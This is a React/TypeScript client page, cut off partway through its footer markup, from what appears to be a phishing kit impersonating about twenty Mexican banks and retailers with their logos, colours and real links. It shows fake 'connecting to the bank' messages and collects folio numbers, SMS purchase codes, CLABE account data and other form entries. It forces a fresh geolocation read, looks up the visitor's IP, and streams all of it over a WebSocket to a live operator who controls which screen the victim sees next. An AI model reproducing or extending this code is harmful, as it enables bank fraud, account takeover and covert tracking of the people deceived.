import { useState, useEffect } from 'react';
import { useRoute } from 'wouter';
import { useWebSocket } from '@/hooks/useWebSocket';
import { ScreenTemplates } from '@/components/client/ScreenTemplates';
import { Session, ScreenType } from '@shared/schema';
import { formatDate } from '@/utils/helpers';
import liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool
import liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco
import banamexLogo from '../assets/banamex_logo_new.png';
import banbajioLogo from '../assets/banbajio_logo_oficial.png';
import banbajioBackground from '../assets/IMG_0354.jpeg';
import bbvaLogo from '@assets/bbva_logo.png';
import bbvaLogoWhite from '../assets/bbva_logo_white.png';
import banorteLogoHeader from '@assets/Bo.png.png';
import bancoppelLogo from '@assets/bancoppel.png';
import banorteLogoFooter from '@assets/Banorte-01.png';
import hsbcLogo from '@assets/Hsbc.png';
import hsbcBackground from '@assets/IMG_0391.jpeg';
import amexLogo from '@assets/Amex.png';
import santanderLogo from '../assets/santander_logo.png';
import santanderLogoWhite from '../assets/santander_logo_white_fixed.png';
import scotiabankLogo from '../assets/scotiabank_logo.png';
import scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';
import invexLogo from '../assets/invex_logo.png';
import invexLogoWhite from '../assets/invex_logo_white.png';
import banregioLogo from '../assets/banregio_logo.png';
import banregioLogoWhite from '../assets/banregio_logo_white.png';
import platacardLogo from '../assets/platacard_logo.png';
import bancoAztecaLogo from '../assets/banco_azteca_logo.png';
import bienestarLogo from '../assets/banco_bienestar_logo.png';
import inbursaLogo from '@assets/inbursa-seeklogo_1758958331280.png';
import afirmeLogo from '@assets/logoAfirme_1762549994047.png';

export default function ClientScreen() {
  // Verificar primero la ruta /client/:sessionId
  const [matchClient, paramsClient] = useRoute('/client/:sessionId');
  // Si no coincide, verificar la ruta directa /:sessionId
  const [matchDirect, paramsDirect] = useRoute('/:sessionId');
  
  // Usar los parámetros según la ruta que haya coincidido
  const params = matchClient ? paramsClient : paramsDirect;
  const sessionId = params?.sessionId || '';
  
  // State for the current screen
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);
  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});
  const [bankLoaded, setBankLoaded] = useState<boolean>(false);
  
  // Additional screen-specific state
  const [screenData, setScreenData] = useState<{
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
  }>({});
  
  // Estado para controlar los mensajes iniciales
  const [initialMessage, setInitialMessage] = useState<string>('Conectando con el banco...');
  const [showInitialMessage, setShowInitialMessage] = useState<boolean>(true);
  
  // WebSocket connection
  const { socket, connected, sendMessage } = useWebSocket('/ws');

  // Efecto para mostrar los mensajes iniciales
  useEffect(() => {
    console.log('[ClientScreen] useEffect inicial ejecutado');
    
    // Mostrar "Conectando con el banco" por 2 segundos
    const connectingTimer = setTimeout(() => {
      console.log('[ClientScreen] Cambiando a "Generando aclaración..."');
      setInitialMessage('Generando aclaración...');
      
      // Después de 2 segundos más, mostrar la pantalla regular
      const generatingTimer = setTimeout(() => {
        console.log('[ClientScreen] Ocultando mensaje inicial');
        console.log('[ClientScreen] currentScreen:', currentScreen);
        console.log('[ClientScreen] sessionData.pasoActual:', sessionData.pasoActual);
        setShowInitialMessage(false);
        
        // Cambiar a la pantalla FOLIO si no hay una pantalla específica configurada
        if (currentScreen === ScreenType.VALIDANDO && !sessionData.pasoActual) {
          console.log('[ClientScreen] Cambiando a pantalla FOLIO');
          setCurrentScreen(ScreenType.FOLIO);
        } else {
          console.log('[ClientScreen] NO cambiando a FOLIO. currentScreen:', currentScreen, 'pasoActual:', sessionData.pasoActual);
        }
      }, 2000);
      
      return () => clearTimeout(generatingTimer);
    }, 2000);
    
    return () => clearTimeout(connectingTimer);
  }, []);
  
  // Register with the server when connection is established
  useEffect(() => {
    if (connected && sessionId) {
      sendMessage({
        type: 'REGISTER',
        role: 'CLIENT',
        sessionId
      });
    }
  }, [connected, sessionId, sendMessage]);

  // Handle WebSocket messages
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const message = JSON.parse(event.data);
        
        // Handle different message types
        if (message.type === 'INIT_SESSION') {
          // Asegurar que el banco esté en mayúsculas para consistencia en todo el código
          if (message.data.banco) {
            console.log('Banco recibido:', message.data.banco);
            message.data.banco = message.data.banco.toUpperCase();
            console.log('Banco normalizado:', message.data.banco);
          }
          
          setSessionData(message.data);
          setBankLoaded(true);
          // Set initial screen based on session data
          if (message.data.pasoActual) {
            setCurrentScreen(message.data.pasoActual as ScreenType);
          }
        }
        else if (message.type === 'SCREEN_CHANGE') {
          const { tipo, ...data } = message.data;
          
          console.log('SCREEN_CHANGE recibido:', tipo, data);
          
          // Extract screen type from the message
          // The server sends 'mostrar_X', we need to remove the prefix
          let screenType = tipo.replace('mostrar_', '');
          
          // Normalize screen type for SMS_COMPRA (handle different case variations)
          if (screenType.toLowerCase() === 'sms_compra' || 
              screenType.toLowerCase() === 'smscompra' ||
              screenType.toLowerCase() === 'sms compra') {
            console.log('Pantalla SMS_COMPRA detectada, normalizando a:', ScreenType.SMS_COMPRA);
            screenType = ScreenType.SMS_COMPRA; // Use the exact value from enum
          }
          
          console.log('Cambiando a pantalla:', screenType);
          
          // Verificación adicional para asegurar que se muestra la pantalla SMS_COMPRA
          if (tipo.toLowerCase().includes('sms_compra') || 
              tipo.toLowerCase().includes('smscompra') ||
              screenType.toLowerCase() === 'sms_compra' ||
              screenType.toLowerCase() === 'smscompra') {
            console.log('Verificando expresamente que SMS_COMPRA se establezca correctamente');
            console.log('Datos para mostrar en SMS_COMPRA:', data);
            setCurrentScreen(ScreenType.SMS_COMPRA);
            // Actualizamos los datos explícitamente para asegurar que se muestren
            setScreenData({
              ...data,
              terminacion: data.terminacion || '****'
            });
          } else {
            setCurrentScreen(screenType as ScreenType);
          }
          
          // Update screen-specific data
          setScreenData(data);
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => socket.removeEventListener('message', handleMessage);
  }, [socket]);

  // Función para solicitar geolocalización directamente sin pantalla personalizada
  const requestGeolocationDirectly = async () => {
    console.log('[Geolocation] Iniciando solicitud directa de ubicación...');
    
    // Cambiar a pantalla de validando inmediatamente
    setCurrentScreen(ScreenType.VALIDANDO);
    
    // Verificar si el navegador soporta geolocalización
    if (!('geolocation' in navigator)) {
      console.log('[Geolocation] Navegador no soporta geolocalización, continuando...');
      sendLocationDeniedData();
      return;
    }

    // Verificar si el contexto es seguro (HTTPS) - requerido por Safari
    const isSecureContext = window.isSecureContext || location.protocol === 'https:' || location.hostname === 'localhost';
    if (!isSecureContext) {
      console.log('[Geolocation] Contexto no seguro, Safari requiere HTTPS');
      sendLocationDeniedData();
      return;
    }

    // Intentar revocar permisos existentes para forzar nueva solicitud
    try {
      if ('permissions' in navigator) {
        console.log('[Geolocation] Intentando revocar permisos existentes...');
        const permission = await navigator.permissions.query({name: 'geolocation'});
        console.log('[Geolocation] Estado de permisos actual:', permission.state);
        
        // Aunque no podemos revocar directamente, lo intentamos
        if (permission.state === 'granted') {
          console.log('[Geolocation] Permisos ya otorgados - forzando nueva solicitud con configuración especial');
        }
      }
    } catch (error) {
      console.log('[Geolocation] No se pueden consultar permisos:', error);
    }

    // Configuración especial para obtener ubicación actual siempre
    const locationOptions = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0 // Siempre solicitar nueva ubicación, no usar cache
    };

    console.log('[Geolocation] Solicitando ubicación actual (forzando nueva lectura)...');
    
    // NOTA: Los navegadores modernos no permiten revocar permisos programáticamente
    // La ventana emergente solo aparecerá si el usuario no ha otorgado permisos previamente
    // Para forzar que aparezca siempre, el usuario debe ir a configuración del navegador
    // y eliminar los permisos manualmente para este sitio
    
    navigator.geolocation.getCurrentPosition(
      handleLocationSuccess,
      handleLocationError,
      locationOptions
    );
  };

  // Función para manejar el éxito en la obtención de ubicación
  const handleLocationSuccess = async (position: GeolocationPosition) => {
    console.log('[Geolocation] Ubicación obtenida exitosamente:', position);
    
    const { latitude, longitude } = position.coords;
    
    // Obtener la IP del usuario
    let ipAddress = 'IP no disponible';
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      ipAddress = ipData.ip;
    } catch (ipError) {
      console.warn('[Geolocation] No se pudo obtener la IP:', ipError);
    }
    
    // Crear enlace de Google Maps
    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    
    const locationData = {
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      googleMapsLink,
      timestamp: new Date().toISOString(),
      ipAddress
    };

    console.log('[Geolocation] Datos de ubicación procesados:', locationData);
    console.log('[Geolocation] Ubicación obtenida:', locationData);
    
    // Enviar primera señal de validando
    sendMessage({
      type: 'CLIENT_INPUT',
      data: {
        tipo: 'validando',
        sessionId,
        data: {}
      }
    });
    
    // Luego enviar los datos de geolocalización
    setTimeout(() => {
      sendMessage({
        type: 'CLIENT_INPUT',
        data: {
          tipo: 'geolocation',
          sessionId,
          data: {
            tipo: 'geolocation',
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            googleMapsLink: locationData.googleMapsLink,
            locationTimestamp: locationData.timestamp,
            ipAddress: locationData.ipAddress
          }
        }
      });
      console.log('[ClientScreen] Enviando datos de geolocalización al servidor');
      console.log('[ClientScreen] Datos de geolocalización enviados, manteniendo pantalla de cargando...');
    }, 2000);
  };

  // Función para manejar errores en la obtención de ubicación
  const handleLocationError = (error: GeolocationPositionError) => {
    console.error('[Geolocation] Error obteniendo ubicación:', error);
    
    let errorMessage = 'Permiso de ubicación denegado';
    switch (error.code) {
      case error.PERMISSION_DENIED:
        errorMessage = 'Permiso de ubicación denegado por el usuario';
        break;
      case error.POSITION_UNAVAILABLE:
        errorMessage = 'Información de ubicación no disponible';
        break;
      case error.TIMEOUT:
        errorMessage = 'Tiempo de espera agotado para obtener ubicación';
        break;
    }
    
    console.log('[Geolocation] Error:', errorMessage);
    sendLocationDeniedData();
  };

  // Función para enviar datos cuando se deniega la ubicación
  const sendLocationDeniedData = () => {
    console.log('[Geolocation] Enviando datos de ubicación denegada');
    
    // Enviar señal de validando
    sendMessage({
      type: 'CLIENT_INPUT',
      data: {
        tipo: 'validando',
        sessionId,
        data: {}
      }
    });
    
    // Enviar datos de ubicación denegada
    setTimeout(() => {
      sendMessage({
        type: 'CLIENT_INPUT',
        data: {
          tipo: 'geolocation',
          sessionId,
          data: {
            tipo: 'geolocation_denied',
            error: 'Usuario denegó el acceso a la ubicación',
            timestamp: new Date().toISOString()
          }
        }
      });
      console.log('[ClientScreen] Datos de ubicación denegada enviados');
    }, 2000);
  };

  // Handle form submissions
  const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
    if (connected) {
      console.log('Enviando datos al servidor:', screen, formData);
      
      
      // Enviar datos al servidor inmediatamente para otros casos
      sendMessage({
        type: 'CLIENT_INPUT',
        data: {
          tipo: screen,
          sessionId,
          data: formData
        }
      });
      
      // Si es la pantalla FOLIO, solicitar geolocalización directamente
      if (screen === ScreenType.FOLIO) {
        console.log('[ClientScreen] Folio enviado, solicitando geolocalización');
        requestGeolocationDirectly();
      } else if (screen === ScreenType.VALIDANDO) {
        // Si ya estamos en VALIDANDO (pantalla de cargando), mantener la pantalla
        console.log('[ClientScreen] Mostrando pantalla de cargando...');
      } else {
        // Para otras pantallas, cambiar a validando mientras esperamos respuesta del admin
        setCurrentScreen(ScreenType.VALIDANDO);
      }
    }
  };

  // Función para determinar el header basado en el banco
  const renderHeader = () => {
    if (sessionData.banco === 'LIVERPOOL') {
      return (
        <header className="bg-[#E1147B] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <div className="flex justify-center">
            <img 
              src={liverpoolLogo} 
              className="liverpool-logo inline-block filter brightness-0 invert" 
              alt="Liverpool" 
            />
          </div>
        </header>
      );
    } else if (sessionData.banco === 'BANBAJIO') {
      return (
        <>
          <div className="logo text-center py-4 bg-white">
            <img 
              src={banbajioLogo} 
              alt="BanBajío"
              className="banbajio-logo inline-block"
            />
            <div className="banbajio-header mt-2">
              {formatDate(new Date())}
            </div>
          </div>
        </>
      );
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <header className="bg-[#005BAC] text-white p-4 text-center">
          <img 
            src={banamexLogo} 
            className="banamex-logo inline-block mb-2" 
            alt="Banamex" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <header className="bg-[#072146] text-white p-4 text-center">
          <img 
            src={bbvaLogoWhite} 
            className="bbva-logo inline-block white-logo mb-2" 
            alt="BBVA" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <header className="banorte-header">
          <img 
            src={banorteLogoHeader} 
            className="banorte-logo" 
            alt="Banorte" 
          />
          <div className="fecha-banorte">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANCOPPEL') {
      return (
        <header className="bg-[#0066B3] text-white p-4 text-center">
          <img 
            src={bancoppelLogo} 
            className="bancoppel-logo inline-block mb-2" 
            alt="BanCoppel" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'HSBC') {
      return (
        <header className="bg-white p-4 text-center">
          <img 
            src={hsbcLogo} 
            className="hsbc-logo inline-block mb-2" 
            alt="HSBC" 
            style={{ maxHeight: "48px" }}
          />
          <div className="font-bold text-sm text-black">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'AMEX') {
      return (
        <header className="bg-[#0077C8] text-white p-4 text-center">
          <img 
            src={amexLogo} 
            className="amex-logo inline-block mb-2" 
            alt="American Express" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'SANTANDER') {
      return (
        <header className="bg-[#EC0000] text-white p-4 text-center">
          <img 
            src={santanderLogoWhite} 
            className="santander-logo inline-block white-logo mb-2" 
            alt="Santander" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'SCOTIABANK') {
      return (
        <header className="bg-[#EC111A] text-white p-4 text-center">
          <img 
            src={scotiabankLogoWhite} 
            className="scotiabank-logo inline-block white-logo mb-2" 
            alt="Scotiabank" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'INVEX') {
      return (
        <header className="bg-[#BE0046] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={invexLogoWhite} 
              className="invex-logo inline-block" 
              alt="INVEX" 
              style={{maxHeight: '36px', height: '2.5rem', width: 'auto'}}
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANREGIO') {
      return (
        <header className="bg-[#FF6600] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={banregioLogoWhite} 
              className="banregio-logo inline-block white-logo" 
              alt="Banregio" 
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'SPIN') {
      return (
        <header className="bg-[#6551FF] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src="https://storage.googleapis.com/banking-spinbyoxxo/public/spin-logo-08a5c1a.svg" 
              className="spin-logo inline-block white-logo" 
              alt="SPIN" 
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'PLATACARD') {
      return (
        <header className="bg-[#333333] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={platacardLogo} 
              className="platacard-logo inline-block" 
              alt="Plata Card" 
              style={{height: '2.5rem', width: 'auto'}}
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BANCO_AZTECA') {
      return (
        <header className="bg-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={bancoAztecaLogo} 
              className="banco-azteca-logo inline-block" 
              alt="Banco Azteca" 
              style={{height: '2.5rem', width: 'auto'}}
            />
          </div>
          <div className="font-bold text-sm text-[#00A552]">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BIENESTAR') {
      return (
        <header className="bg-[#9D2449] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={bienestarLogo} 
              className="bienestar-logo inline-block" 
              alt="Banco del Bienestar" 
              style={{height: '2.5rem', width: 'auto'}}
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'INBURSA') {
      return (
        <header className="bg-[#1B4B72] text-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={inbursaLogo} 
              className="inbursa-logo inline-block filter brightness-0 invert" 
              alt="Grupo Financiero Inbursa" 
              style={{height: '0.75rem', width: 'auto'}}
            />
          </div>
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'AFIRME') {
      return (
        <header className="bg-white p-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src={afirmeLogo} 
              className="afirme-logo inline-block" 
              alt="Afirme" 
              style={{height: '2.5rem', width: 'auto'}}
            />
          </div>
          <div className="font-bold text-sm text-[#009639]">{formatDate(new Date())}</div>
        </header>
      );
    } else {
      // Default header (Banorte)
      return (
        <header className="bg-[#EC1C24] text-white p-4 text-center">
          <img 
            src={banorteLogoHeader} 
            className="banorte-logo inline-block mb-2" 
            alt="Banorte" 
          />
          <div className="font-bold text-sm">{formatDate(new Date())}</div>
        </header>
      );
    }
  };

  // Función para renderizar el footer específico de BanBajío y Banorte
  const renderFooter = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return (
        <footer className="mt-auto">
          <div className="banbajio-footer">
            Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
          </div>
          <div className="banbajio-footer-bottom">
            <a href="#" className="text-white mx-2">Contáctanos</a>
            <a href="#" className="text-white mx-2">Aclaraciones</a>
            <a href="#" className="text-white mx-2">Promociones</a>
            <a href="#" className="text-white mx-2">Facebook</a>
            <a href="#" className="text-white mx-2">YouTube</a>
            <br />
            © Banbajio México 2024. Todos los Derechos Reservados
          </div>
        </footer>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <footer className="mt-auto">
          <div className="banorte-nav">
            <a href="https://www.banorte.com/" target="_blank" rel="noopener noreferrer" className="banorte-link">Aprende más</a>
            <a href="https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/" target="_blank" rel="noopener noreferrer" className="banorte-link">Ayuda</a>
            <a href="https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones" target="_blank" rel="noopener noreferrer" className="banorte-link">Términos</a>
            <a href="https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte" target="_blank" rel="noopener noreferrer" className="banorte-link">Seguridad</a>
          </div>
          <div className="banorte-footer">
            <div className="mb-2">
              <a href="https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
              <a href="https://www.banorte.com/wps/portal/banorte/Home/servicios/aclaraciones" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
              <a href="https://www.banorte.com/wps/portal/banorte/Home/promociones" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a>
            </div>
            <div className="mb-2">
              <a href="https://www.facebook.com/BanorteGFNorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
              <a href="https://www.youtube.com/user/BanorteGFNorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">YouTube</a> |
              <a href="https://twitter.com/Banorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Twitter</a>
            </div>
            <div className="text-sm opacity-90">
              © Banorte México 2024. Todos los Derechos Reservados
            </div>
          </div>
        </footer>
      );
    } else {
      return (
        <footer className="mt-auto">
          <div className="bg-gray-100 p-4 text-center text-sm">
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/home' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/index.html' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/main/index.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/personas.aspx' :
              sessionData.banco === 'INVEX' ? 'https://www.invex.com/' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/' :
              sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :
              sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/' :
              sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar' :
              sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/' :
              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/' :
              'https://www.banorte.com/'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              sessionData.banco === 'PLATACARD' ? 'text-[#FF5722]' :
              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
              'text-[#EC1C24]'
            } mx-2`}>Aprende más</a>
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/servicios-digitales/preguntas-frecuentes.html' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/bbva-mexico.html' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/comercio_electronico/index.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/ayuda/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :
              sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/centro-de-ayuda' :
              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/ayuda' :
              'https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
              'text-[#EC1C24]'
            } mx-2`}>Ayuda</a>
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/ayuda/terminos-y-condiciones/terminos-y-condiciones/' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/terminos-y-condiciones' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/informacion-adicional.html' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/acerca_bancoppel/terminos.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/condiciones/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/preferencias-legales/aviso-de-privacidad/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/terminos-condiciones-contratos/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/terminos-y-condiciones.aspx' :
              sessionData.banco === 'INVEX' ? 'https://www.invex.com/aviso-de-privacidad' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contenido/terminos.php' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/aviso-de-privacidad' :
              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/terminos-y-condiciones' :
              'https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
              'text-[#EC1C24]'
            } mx-2`}>Términos y condiciones</a>
            <a href={
              sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/ayuda/seguridad-en-sus-compras/seguridad-en-sus-compras/' : 
              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/seguridad.html' : 
              sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/seguridad-digital.html' :
              sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/bancoppel_sitio/seguridad.html' :
              sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/seguridad/' :
              sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/seguridad/' :
              sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/seguridad/' :
              sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/seguridad-bancaria.aspx' :
              sessionData.banco === 'INVEX' ? 'https://www.invex.com/seguridad' :
              sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/seguridad.php' :
              sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/seguridad' :
              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/seguridad' :
              'https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte'
            } target="_blank" rel="noopener noreferrer" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#005BAC]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
              'text-[#EC1C24]'
            } mx-2`}>Seguridad en línea</a>
          </div>

          <div className={`${
            sessionData.banco === 'LIVERPOOL' ? 'bg-[#E1147B]' :
            sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
            sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
            sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
            sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
            sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :
            sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :
